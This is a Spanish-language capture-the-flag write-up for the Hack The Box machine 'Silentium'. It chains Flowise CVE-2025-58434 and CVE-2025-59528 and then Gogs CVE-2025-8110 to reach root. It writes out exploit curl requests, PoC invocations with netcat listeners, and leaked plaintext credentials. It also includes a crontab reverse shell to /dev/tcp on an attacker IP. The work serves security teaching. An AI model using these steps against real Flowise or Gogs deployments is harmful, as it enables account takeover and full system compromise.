# HTB - Silentium Writeup

**Autor:** TRNNSK
**Dificultad:** Easy (esto de verdad no deberia estar en easy, deberia ser intermedia)
**Sistema:** Linux

---

# Resumen

La máquina **Silentium** presenta una cadena de vulnerabilidades que debemos escalar para llegar al control total de root. Vamos a hacer uso de CVE-2025-58434, una vulnerabilidad de account takeover en Flowise, para obtener acceso autenticado, luego CVE-2025-59528 para obtener RCE en el contenedor, escalando a un usuario del host mediante credenciales expuestas en variables de entorno, y finalmente CVE-2025-8110 en Gogs para escribir en `/etc/crontab` y obtener shell como root.

---

# Enumeración

## Escaneo inicial

```bash
nmap -sS -sV -sC -p- -T4 silentium.htb
```

### Resultados:

```
22/tcp open  ssh     OpenSSH 9.6p1
80/tcp open  http    nginx 1.24.0
```

---

# Análisis Web

Al acceder al puerto 80 se identifica un sitio corporativo estático de "Silentium International Asset Management". El código fuente revela nombres del equipo en la sección Leadership:

- **Marcus Thorne** — Managing Director
- **Ben** — Head of Financial Systems (solo nombre, sospechoso)
- **Elena Rossi** — Chief Risk Officer

Gobuster no puede avanzar porque nginx devuelve 200 para todas las rutas. Se procede con fuzzing de subdominios:

```bash
ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 8753
```

Se descubre el subdominio `staging.silentium.htb` que corre **Flowise 3.0.5**.

```bash
curl -s http://staging.silentium.htb/api/v1/version
# {"version":"3.0.5"}
```

---

# Vulnerabilidad: CVE-2025-58434 — Password Reset Token Disclosure

## Identificación

Flowise 3.0.5 es vulnerable a account takeover via el endpoint `/api/v1/account/forgot-password`, que devuelve el `tempToken` de reset directamente en la respuesta HTTP sin autenticación.

Primero se confirma que `ben@silentium.htb` es un usuario válido (devuelve 401 en vez de 404).

## Explotación

```bash
# Paso 1 — Obtener el tempToken
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

La respuesta incluye el `tempToken` válido.

```bash
# Paso 2 — Resetear la contraseña
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user":{
      "email":"ben@silentium.htb",
      "tempToken":"TOKEN_OBTENIDO",
      "password":"hacked123!"
    }
  }'
```

---

# Vulnerabilidad: CVE-2025-59528 — Flowise CustomMCP RCE

## Identificación

Flowise 3.0.5 es vulnerable a RCE via el endpoint `/api/v1/node-load-method/customMCP`. El parámetro `mcpServerConfig` pasa directamente a un constructor `Function()` sin sanitización, equivalente a `eval()`.

## Explotación

Se usa el PoC que encadena CVE-2025-58434 y CVE-2025-59528:

```bash
git clone https://github.com/AzureADTrent/CVE-2025-58434-59528
cd CVE-2025-58434-59528

# Listener
nc -lvnp 4444

# Exploit
python3 flowise_chain.py \
  -t http://staging.silentium.htb \
  -e ben@silentium.htb \
  --lhost 10.10.15.18 \
  --lport 4444
```

Se obtiene shell como root **dentro del contenedor Docker** que es algo que nos damos cuenta al buscar flags de Flowise.

---

# Lateral Movement — Credenciales en Variables de Entorno

Dentro del contenedor se extraen las variables de entorno:

```bash
env
```

Se encuentran credenciales en texto plano:

```
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
```

Se prueba SSH al host con la contraseña de SMTP:

```bash
ssh ben@silentium.htb
# contraseña: r04D!!_R4ge
```

Login exitoso. Se recoge la flag de usuario:

```bash
cat ~/user.txt
```

---

# Escalada de Privilegios

## Enumeración

Sin acceso sudo y con SUID estándar, se enumera procesos y servicios corriendo:

```bash
ps aux | grep root
systemctl list-units --type=service --state=running
```

Se identifica **Gogs** corriendo en el puerto 3001 como root:

```
root  1514  /opt/gogs/gogs/gogs web
```

La configuración de Gogs en `/opt/gogs/gogs/custom/conf/app.ini` revela:
- Puerto: 3001
- DB SQLite en: `/opt/gogs/data/gogs.db`
- Repos en: `/root/gogs-repositories`
- Registro abierto: `DISABLE_REGISTRATION = false`

Se crea una cuenta en Gogs y se autentica:

```bash
curl -s http://localhost:3001/api/v1/users/search \
  -u TUUSARIO:TUPASSWORD
# {"data":[],"ok":true}
```

## Vulnerabilidad: CVE-2025-8110 — Gogs Arbitrary File Write via Symlink

Gogs <= 0.13.3 permite a usuarios autenticados escribir archivos arbitrarios fuera del repositorio usando symlinks en la API `PutContents`.

## Explotación

```bash
git clone https://github.com/3jee/CVE-2025-8110
cd CVE-2025-8110

# Listener
nc -lvnp 1234

# Sobrescribe /etc/crontab con reverse shell
python3 CVE-2025-8110.py \
  --url http://localhost:3001 \
  -u TUUSARIO \
  -p TUPASSWORD \
  --target-file /etc/crontab \
  --content 'SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root bash -i >& /dev/tcp/10.10.15.18/1234 0>&1
'
```

El cron se ejecuta cada minuto como root. Al cabo de un minuto llega la conexión.

---

# Obtener la Flag

```bash
cat /root/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap
2. Fuzzear subdominios para encontrar `staging.silentium.htb` con Flowise 3.0.5
3. Explotar CVE-2025-58434 para obtener tempToken de `ben` y resetear su contraseña
4. Explotar CVE-2025-59528 via PoC encadenado para obtener RCE en el contenedor Docker
5. Extraer credenciales de las variables de entorno del contenedor
6. Hacer SSH al host como `ben` con la contraseña de SMTP
7. Identificar Gogs corriendo en puerto 3001 como root
8. Registrar usuario en Gogs
9. Explotar CVE-2025-8110 para sobrescribir `/etc/crontab`
10. Esperar 1 minuto y recibir shell root via cron

---

# Conclusión

Esta máquina demuestra cómo:

- Los entornos de staging expuestos públicamente amplían la superficie de ataque
- El diseño inseguro del reset de contraseña permite account takeover sin acceso al email
- El uso de `eval()` equivalente sin sanitización en plataformas de IA permite RCE
- Las credenciales hardcodeadas en variables de entorno de contenedores exponen el host
- Servicios Git self-hosted sin actualizar permiten escritura arbitraria de archivos via symlinks
- Un cron mal configurado combinado con escritura en `/etc/crontab` lleva a root en minutos

---

y ya
